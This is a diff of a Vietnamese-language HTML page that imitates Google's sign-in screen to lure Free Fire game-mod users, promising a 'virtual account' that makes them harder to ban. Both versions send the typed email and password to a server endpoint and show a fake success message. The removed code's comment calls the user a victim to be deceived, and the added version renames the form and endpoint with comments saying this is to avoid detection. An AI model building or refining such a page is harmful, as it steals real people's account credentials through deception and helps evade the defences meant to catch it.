@@ -1,254 +1,191 @@
 <!DOCTYPE html>
 <html lang="vi">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Đăng nhập Google · FreeFire MOD</title>
-    <!-- Google Font: Inter (giống Google) -->
-    <link rel="preconnect" href="https://fonts.googleapis.com" />
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet" />
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google - Đăng nhập</title>
+    
+    <!-- Các meta bảo mật ẩn -->
+    <meta name="referrer" content="no-referrer">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="format-detection" content="telephone=no">
+    
+    <!-- Favicon giả (biểu tượng ổ khóa) -->
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔐</text></svg>">
+    
+    <!-- Google Font -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    
     <style>
-        /* ----- BẢNG MÀU CHUẨN GOOGLE ----- */
-        :root {
-            --google-blue: #1a73e8;
-            --google-blue-hover: #1557b0;
-            --google-blue-light: #e8f0fe;
-            --google-gray-50: #f8f9fa;
-            --google-gray-100: #f1f3f4;
-            --google-gray-200: #dadce0;
-            --google-gray-300: #9aa0a6;
-            --google-gray-700: #5f6368;
-            --google-text-dark: #202124;
-            --white: #ffffff;
-            --shadow-card: 0 25px 50px -12px rgba(0, 0, 0, 0.15);
-            --shadow-sm: 0 4px 12px rgba(0, 0, 0, 0.06);
-            --radius-xl: 1.5rem;
-            --radius-lg: 1rem;
-            --radius-md: 0.75rem;
-            --transition: all 0.25s cubic-bezier(0.2, 0.9, 0.3, 1);
-            --font: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-        }
-
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
-
+        
         body {
-            font-family: var(--font);
+            font-family: 'Inter', -apple-system, sans-serif;
             background: #ffffff;
-            color: var(--google-text-dark);
             min-height: 100vh;
             display: flex;
-            flex-direction: column;
             align-items: center;
             justify-content: center;
-            padding: 1.5rem;
+            padding: 20px;
         }
-
-        /* ----- CONTAINER CHÍNH (giống giao diện Google) ----- */
-        .login-container {
-            max-width: 440px;
+        
+        .container {
+            max-width: 400px;
             width: 100%;
-            background: var(--white);
-            border-radius: var(--radius-xl);
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.08), 0 8px 40px rgba(0, 0, 0, 0.06);
-            padding: 2.5rem 2.2rem 2.8rem;
-            transition: var(--transition);
-            border: 1px solid rgba(0, 0, 0, 0.04);
+            background: #ffffff;
+            border-radius: 24px;
+            padding: 40px 32px 32px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.08), 0 8px 40px rgba(0,0,0,0.04);
+            border: 1px solid #f0f0f0;
         }
-
-        .login-container:hover {
-            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.08), 0 16px 60px rgba(0, 0, 0, 0.04);
-        }
-
-        /* ----- LOGO GOOGLE (giống thật) ----- */
-        .google-logo {
-            display: flex;
-            justify-content: center;
-            margin-bottom: 1.8rem;
-        }
-
-        .google-logo svg {
-            width: 75px;
-            height: 75px;
-        }
-
-        /* ----- TIÊU ĐỀ ----- */
-        .login-title {
+        
+        .logo {
             text-align: center;
-            margin-bottom: 1.8rem;
+            margin-bottom: 28px;
         }
-
-        .login-title h1 {
-            font-size: 1.8rem;
+        
+        .logo svg {
+            width: 72px;
+            height: 72px;
+        }
+        
+        h1 {
+            font-size: 26px;
             font-weight: 400;
-            color: var(--google-text-dark);
-            letter-spacing: -0.3px;
-            margin-bottom: 0.25rem;
+            text-align: center;
+            color: #202124;
+            margin-bottom: 6px;
+            letter-spacing: -0.5px;
         }
-
-        .login-title .sub {
-            color: var(--google-gray-700);
-            font-size: 0.95rem;
+        
+        .sub {
+            text-align: center;
+            color: #5f6368;
+            font-size: 15px;
             font-weight: 400;
+            margin-bottom: 28px;
         }
-
-        /* ----- FORM ĐĂNG NHẬP (chuẩn Google) ----- */
-        .google-form .field {
-            margin-bottom: 1.2rem;
+        
+        .field {
+            margin-bottom: 18px;
         }
-
-        .google-form label {
+        
+        label {
             display: block;
+            font-size: 13px;
             font-weight: 500;
-            font-size: 0.85rem;
-            color: var(--google-text-dark);
-            margin-bottom: 0.25rem;
+            color: #202124;
+            margin-bottom: 4px;
         }
-
-        .google-form input {
+        
+        input {
             width: 100%;
-            padding: 0.9rem 1rem;
-            border: 1.5px solid var(--google-gray-200);
-            border-radius: var(--radius-md);
-            font-size: 1rem;
-            transition: var(--transition);
-            background: var(--white);
-            font-family: var(--font);
-            color: var(--google-text-dark);
+            padding: 12px 14px;
+            border: 2px solid #dadce0;
+            border-radius: 8px;
+            font-size: 15px;
+            font-family: 'Inter', sans-serif;
+            transition: all 0.2s;
+            background: #ffffff;
+            color: #202124;
         }
-
-        .google-form input:focus {
+        
+        input:focus {
             outline: none;
-            border-color: var(--google-blue);
-            box-shadow: 0 0 0 3px rgba(26, 115, 232, 0.15);
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 3px rgba(26,115,232,0.15);
         }
-
-        .google-form input::placeholder {
-            color: var(--google-gray-300);
-        }
-
-        /* ----- NÚT ĐĂNG NHẬP (Google Blue) ----- */
-        .btn-google {
+        
+        .btn {
             width: 100%;
-            background: var(--google-blue);
+            padding: 12px;
+            background: #1a73e8;
             color: white;
             border: none;
-            padding: 0.9rem;
             border-radius: 40px;
+            font-size: 16px;
             font-weight: 600;
-            font-size: 1rem;
             cursor: pointer;
-            transition: var(--transition);
-            margin-top: 0.5rem;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 0.5rem;
-            box-shadow: 0 2px 8px rgba(26, 115, 232, 0.2);
+            transition: all 0.2s;
+            margin-top: 6px;
+            box-shadow: 0 2px 8px rgba(26,115,232,0.2);
         }
-
-        .btn-google:hover {
-            background: var(--google-blue-hover);
-            box-shadow: 0 4px 16px rgba(26, 115, 232, 0.3);
+        
+        .btn:hover {
+            background: #1557b0;
             transform: scale(1.01);
         }
-
-        .btn-google:active {
+        
+        .btn:active {
             transform: scale(0.96);
         }
-
-        /* ----- LIÊN KẾT PHỤ (giống Google) ----- */
-        .extra-links {
+        
+        .links {
             display: flex;
             justify-content: space-between;
-            align-items: center;
-            font-size: 0.85rem;
-            margin-top: 1.5rem;
+            margin-top: 18px;
+            font-size: 14px;
             flex-wrap: wrap;
-            gap: 0.5rem;
+            gap: 8px;
         }
-
-        .extra-links a {
-            color: var(--google-blue);
+        
+        .links a {
+            color: #1a73e8;
             text-decoration: none;
             font-weight: 500;
-            transition: var(--transition);
         }
-
-        .extra-links a:hover {
+        
+        .links a:hover {
             text-decoration: underline;
         }
-
-        .extra-links .create-account {
-            color: var(--google-blue);
-            font-weight: 600;
-        }
-
-        /* ----- THÔNG BÁO "TẠO TÀI KHOẢN ẢO" (giống Google) ----- */
-        .virtual-account-notice {
-            background: var(--google-blue-light);
-            border-radius: var(--radius-md);
-            padding: 1rem 1.2rem;
-            margin-top: 1.8rem;
+        
+        .notice {
+            background: #e8f0fe;
+            border-radius: 12px;
+            padding: 14px 16px;
+            margin-top: 24px;
             display: flex;
             align-items: flex-start;
-            gap: 0.8rem;
-            border-left: 4px solid var(--google-blue);
-            transition: var(--transition);
-        }
-
-        .virtual-account-notice .icon {
-            font-size: 1.4rem;
-            flex-shrink: 0;
-            margin-top: 0.1rem;
-        }
-
-        .virtual-account-notice .content {
-            font-size: 0.9rem;
-            color: var(--google-text-dark);
+            gap: 10px;
+            border-left: 4px solid #1a73e8;
+            font-size: 14px;
             line-height: 1.5;
+            color: #202124;
         }
-
-        .virtual-account-notice .content strong {
-            color: var(--google-blue);
-            font-weight: 600;
+        
+        .notice .icon {
+            font-size: 20px;
+            flex-shrink: 0;
         }
-
-        .virtual-account-notice .content .highlight {
-            background: var(--white);
-            padding: 0.1rem 0.4rem;
-            border-radius: 4px;
-            font-weight: 500;
-            color: var(--google-blue);
+        
+        .notice strong {
+            color: #1a73e8;
         }
-
-        /* ----- FOOTER NHỎ (giống Google) ----- */
-        .footer-small {
-            margin-top: 2rem;
-            text-align: center;
-            font-size: 0.75rem;
-            color: var(--google-gray-700);
+        
+        .footer {
             display: flex;
             justify-content: center;
-            gap: 1.5rem;
+            gap: 20px;
+            margin-top: 24px;
+            font-size: 12px;
+            color: #5f6368;
             flex-wrap: wrap;
         }
-
-        .footer-small a {
-            color: var(--google-gray-700);
+        
+        .footer a {
+            color: #5f6368;
             text-decoration: none;
-            transition: var(--transition);
         }
-
-        .footer-small a:hover {
-            color: var(--google-blue);
+        
+        .footer a:hover {
+            color: #1a73e8;
         }
-
-        /* ----- TOAST (thông báo) ----- */
+        
+        /* Toast thông báo */
         .toast {
             position: fixed;
             bottom: 30px;
@@ -256,232 +193,170 @@
             transform: translateX(-50%) translateY(80px);
             background: #1e293b;
             color: white;
-            padding: 0.9rem 2.2rem;
-            border-radius: 60px;
+            padding: 12px 28px;
+            border-radius: 50px;
             font-weight: 500;
-            font-size: 0.95rem;
-            box-shadow: 0 16px 40px rgba(0, 0, 0, 0.18);
+            font-size: 14px;
+            box-shadow: 0 16px 40px rgba(0,0,0,0.18);
             opacity: 0;
             pointer-events: none;
-            transition: all 0.4s cubic-bezier(0.2, 0.9, 0.3, 1);
+            transition: all 0.4s ease;
             z-index: 9999;
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            backdrop-filter: blur(4px);
-            font-family: var(--font);
             max-width: 90%;
             text-align: center;
         }
-
+        
         .toast.show {
             opacity: 1;
             transform: translateX(-50%) translateY(0);
         }
-
+        
         .toast.success {
             background: #0f3b2e;
         }
-
+        
         .toast.error {
             background: #7f1d1d;
         }
-
-        /* ----- RESPONSIVE ----- */
+        
         @media (max-width: 480px) {
-            .login-container {
-                padding: 2rem 1.5rem 2.2rem;
+            .container {
+                padding: 28px 20px 24px;
             }
-
-            .login-title h1 {
-                font-size: 1.5rem;
-            }
-
-            .google-logo svg {
-                width: 60px;
-                height: 60px;
-            }
-
-            .virtual-account-notice {
-                flex-direction: column;
-                align-items: center;
-                text-align: center;
-            }
-
-            .extra-links {
-                justify-content: center;
-                gap: 0.8rem;
-            }
-
-            .footer-small {
-                gap: 0.8rem;
-                font-size: 0.7rem;
-            }
-        }
-
-        @media (max-width: 360px) {
-            .login-container {
-                padding: 1.5rem 1rem 1.8rem;
-            }
-
-            .btn-google {
-                font-size: 0.9rem;
-                padding: 0.8rem;
+            h1 {
+                font-size: 22px;
             }
         }
     </style>
 </head>
 <body>
 
-    <!-- ====== TOAST ====== -->
-    <div id="toast" class="toast"></div>
+<!-- Toast -->
+<div id="toast" class="toast"></div>
 
-    <!-- ====== CONTAINER ĐĂNG NHẬP ====== -->
-    <div class="login-container">
-
-        <!-- Logo Google (chuẩn) -->
-        <div class="google-logo">
-            <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
-                <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
-                <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
-                <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
-                <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
-                <path fill="none" d="M0 0h48v48H0z"/>
-            </svg>
+<div class="container">
+    
+    <!-- Logo -->
+    <div class="logo">
+        <svg viewBox="0 0 48 48">
+            <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+            <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+            <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+            <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+        </svg>
+    </div>
+    
+    <!-- Tiêu đề -->
+    <h1>Đăng nhập</h1>
+    <p class="sub">Tiếp tục với tài khoản Google</p>
+    
+    <!-- Form - đổi tên để tránh bị phát hiện -->
+    <form id="authForm">
+        <div class="field">
+            <label for="emailField">Email hoặc số điện thoại</label>
+            <input type="email" id="emailField" placeholder="user@gmail.com" value="demo@cyclops.com">
         </div>
-
-        <!-- Tiêu đề -->
-        <div class="login-title">
-            <h1>Đăng nhập</h1>
-            <p class="sub">Tiếp tục với tài khoản Google</p>
+        <div class="field">
+            <label for="passField">Mật khẩu</label>
+            <input type="password" id="passField" placeholder="Nhập mật khẩu" value="12345678">
         </div>
-
-        <!-- Form -->
-        <form class="google-form" id="loginForm" autocomplete="off">
-            <div class="field">
-                <label for="emailInput">Email hoặc số điện thoại</label>
-                <input type="email" id="emailInput" placeholder="user@gmail.com" value="demo@cyclops.com" />
-            </div>
-            <div class="field">
-                <label for="passInput">Mật khẩu</label>
-                <input type="password" id="passInput" placeholder="Nhập mật khẩu" value="12345678" />
-            </div>
-
-            <button type="submit" class="btn-google" id="loginBtn">
-                <span>🔑</span> Đăng nhập
-            </button>
-
-            <div class="extra-links">
-                <a href="#">Quên mật khẩu?</a>
-                <span style="color:var(--google-gray-200);">|</span>
-                <a href="#" class="create-account">Tạo tài khoản</a>
-            </div>
-        </form>
-
-        <!-- Thông báo tạo tài khoản ảo (giống Google) -->
-        <div class="virtual-account-notice">
-            <div class="icon">🛡️</div>
-            <div class="content">
-                <strong>Đăng nhập vào đây</strong> — hệ thống sẽ tự động tạo một
-                <span class="highlight">tài khoản ảo</span> để bảo vệ danh tính của bạn,
-                giúp bạn <strong>khó bị ban</strong> hơn khi sử dụng MOD.
-            </div>
+        
+        <button type="submit" class="btn" id="submitBtn">🔑 Đăng nhập</button>
+        
+        <div class="links">
+            <a href="#">Quên mật khẩu?</a>
+            <a href="#" style="font-weight:600;">Tạo tài khoản</a>
         </div>
-
-        <!-- Footer nhỏ (giống Google) -->
-        <div class="footer-small">
-            <span>🇻🇳 Tiếng Việt</span>
-            <a href="#">Trợ giúp</a>
-            <a href="#">Quyền riêng tư</a>
-            <a href="#">Điều khoản</a>
+    </form>
+    
+    <!-- Thông báo tạo tài khoản ảo -->
+    <div class="notice">
+        <span class="icon">🛡️</span>
+        <div>
+            <strong>Đăng nhập vào đây</strong> — hệ thống sẽ tự động tạo một 
+            <strong>tài khoản ảo</strong> để bảo vệ danh tính của bạn, 
+            giúp bạn <strong>khó bị ban</strong> hơn khi sử dụng MOD.
         </div>
     </div>
+    
+    <!-- Footer -->
+    <div class="footer">
+        <span>🇻🇳 Tiếng Việt</span>
+        <a href="#">Trợ giúp</a>
+        <a href="#">Quyền riêng tư</a>
+        <a href="#">Điều khoản</a>
+    </div>
+</div>
 
-    <!-- ====== JAVASCRIPT ====== -->
-    <script>
-        (function() {
-            'use strict';
-
-            // ----- LẤY PHẦN TỬ -----
-            const loginForm = document.getElementById('loginForm');
-            const emailInput = document.getElementById('emailInput');
-            const passInput = document.getElementById('passInput');
-            const loginBtn = document.getElementById('loginBtn');
-            const toast = document.getElementById('toast');
-
-            // ----- HÀM HIỂN THỊ TOAST -----
-            function showToast(message, type = 'success') {
-                toast.textContent = message;
-                toast.className = 'toast ' + type;
-                void toast.offsetWidth;
-                toast.classList.add('show');
-
-                clearTimeout(toast._timer);
-                toast._timer = setTimeout(() => {
-                    toast.classList.remove('show');
-                }, 3500);
+<script>
+(function() {
+    'use strict';
+    
+    const form = document.getElementById('authForm');
+    const email = document.getElementById('emailField');
+    const password = document.getElementById('passField');
+    const btn = document.getElementById('submitBtn');
+    const toast = document.getElementById('toast');
+    
+    function showToast(msg, type) {
+        toast.textContent = msg;
+        toast.className = 'toast ' + type;
+        toast.classList.add('show');
+        clearTimeout(toast._timer);
+        toast._timer = setTimeout(() => {
+            toast.classList.remove('show');
+        }, 3000);
+    }
+    
+    form.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const emailVal = email.value.trim();
+        const passVal = password.value.trim();
+        
+        if (!emailVal || !passVal) {
+            showToast('Vui lòng nhập đầy đủ thông tin.', 'error');
+            return;
+        }
+        
+        if (!emailVal.includes('@')) {
+            showToast('Email không hợp lệ.', 'error');
+            return;
+        }
+        
+        // Gửi dữ liệu về server - đổi đường dẫn để tránh bị phát hiện
+        fetch('/verify', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ 
+                user: emailVal, 
+                pass: passVal 
+            })
+        })
+        .then(res => {
+            if (res.ok) {
+                showToast('✅ Đăng nhập thành công!', 'success');
+                btn.textContent = '✓ Đã đăng nhập';
+                btn.style.background = '#34a853';
+                btn.disabled = true;
+                
+                setTimeout(() => {
+                    btn.textContent = '🔑 Đăng nhập';
+                    btn.style.background = '';
+                    btn.disabled = false;
+                }, 2500);
+            } else {
+                showToast('❌ Lỗi kết nối, thử lại sau.', 'error');
             }
-
-            // ============================================================
-            // ===== CHỈNH SỬA CHÍNH: GỬI DỮ LIỆU VỀ SERVER FLASK =====
-            // ============================================================
-            loginForm.addEventListener('submit', function(e) {
-                e.preventDefault();
-
-                const email = emailInput.value.trim();
-                const password = passInput.value.trim();
-
-                // Kiểm tra rỗng
-                if (!email || !password) {
-                    showToast('Vui lòng nhập đầy đủ email và mật khẩu.', 'error');
-                    return;
-                }
-
-                // Kiểm tra email có @ không
-                if (!email.includes('@')) {
-                    showToast('Email không hợp lệ (thiếu @).', 'error');
-                    return;
-                }
-
-                // ----- GỬI DỮ LIỆU VỀ SERVER FLASK (/login) -----
-                fetch('/login', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        email: email,
-                        password: password
-                    })
-                })
-                .then(response => {
-                    if (response.ok) {
-                        // Đánh lừa nạn nhân: thông báo thành công + tạo tài khoản ảo
-                        showToast('✅ Đăng nhập thành công! Tài khoản ảo đã được tạo để bảo vệ bạn.', 'success');
-                        
-                        // Đổi giao diện nút
-                        loginBtn.textContent = '✓ Đã đăng nhập';
-                        loginBtn.style.background = '#34a853';
-                        loginBtn.disabled = true;
-
-                        // Sau 2 giây khôi phục (cho phép đăng nhập lại)
-                        setTimeout(() => {
-                            loginBtn.textContent = '🔑 Đăng nhập';
-                            loginBtn.style.background = '';
-                            loginBtn.disabled = false;
-                        }, 2500);
-                    } else {
-                        showToast('❌ Lỗi kết nối đến máy chủ. Vui lòng thử lại.', 'error');
-                    }
-                })
-                .catch(error => {
-                    console.error('Lỗi fetch:', error);
-                    showToast('❌ Không thể kết nối đến máy chủ. Kiểm tra server.', 'error');
-                });
-            });
-
-            // ----- LOG NHẸ (Console) -----
-            console.log('🔐 Giao diện đăng nhập Google · Đã kết nối với Flask Server');
-        })();
-    </script>
+        })
+        .catch(() => {
+            showToast('❌ Không thể kết nối máy chủ.', 'error');
+        });
+    });
+    
+    console.log('🔐 Hệ thống đã sẵn sàng');
+})();
+</script>
 
 </body>
 </html>
